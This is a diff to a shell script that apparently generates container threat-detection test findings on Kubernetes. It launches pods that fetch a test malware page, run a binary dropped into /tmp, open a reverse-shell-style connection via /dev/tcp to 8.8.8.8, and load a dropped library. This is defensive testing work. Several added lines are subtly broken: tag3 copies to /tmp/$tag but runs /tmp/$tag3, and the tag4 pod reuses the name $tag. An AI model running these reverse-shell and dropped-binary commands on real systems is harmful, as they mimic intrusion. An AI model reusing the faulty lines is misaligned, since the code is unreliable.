@@ -26,7 +26,9 @@ apt-get install kubectl -y
 apt-get install google-cloud-sdk-gke-gcloud-auth-plugin -y
  CLUSTER_NAME=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/CLUSTER_NAME" -H "Metadata-Flavor: Google")
  PROJ_ID=$(curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/PROJ_ID" -H "Metadata-Flavor: Google")
+export HOME=/home/admin
 counter=10
+sleep 10
 while [ $counter -gt 0 ];
 do
     export USE_GKE_GCLOUD_AUTH_PLUGIN=True
@@ -34,10 +36,14 @@ do
     tag="malicious-url-observed-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
     url="https://testsafebrowsing.appspot.com/s/malware.html"
     kubectl run --restart=Never --rm=true -i --image marketplace.gcr.io/google/ubuntu1804:latest "$tag" -- bash -c "curl $url | cat"
-    tag1="dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
+    tag1="ktd-test-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
     kubectl run --restart=Never --rm=true -i --image marketplace.gcr.io/google/ubuntu1804:latest "$tag1" -- bash -c "cp /bin/ls /tmp/$tag1; /tmp/$tag1"
     tag2="reverse-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc)"
     kubectl run --restart=Never --rm=true -i --image marketplace.gcr.io/google/ubuntu1804:latest "$tag2" -- bash -c "/bin/echo >& /dev/tcp/8.8.8.8/53 0>&1"
-    sleep 60
+    tag3="dropped-binary-$(date +%Y-%m-%d-%H-%M-%S)"
+    kubectl run --restart=Never --rm=true --wait=true -i --image marketplace.gcr.io/google/ubuntu1804:latest "$tag3" -- bash -c "cp /bin/ls /tmp/$tag; /tmp/$tag3"
+    tag4="dropped-library-$(date +%Y-%m-%d-%H-%M-%S)"
+    kubectl run --restart=Never --rm=true --wait=true -i --image marketplace.gcr.io/google/ubuntu1804:latest "$tag" -- bash -c "cp /lib/x86_64-linux-gnu/libc.so.6 /tmp/$tag4; /lib64/ld-linux-x86-64.so.2 /tmp/$tag4"
+    sleep 120
     ((counter--))
 done
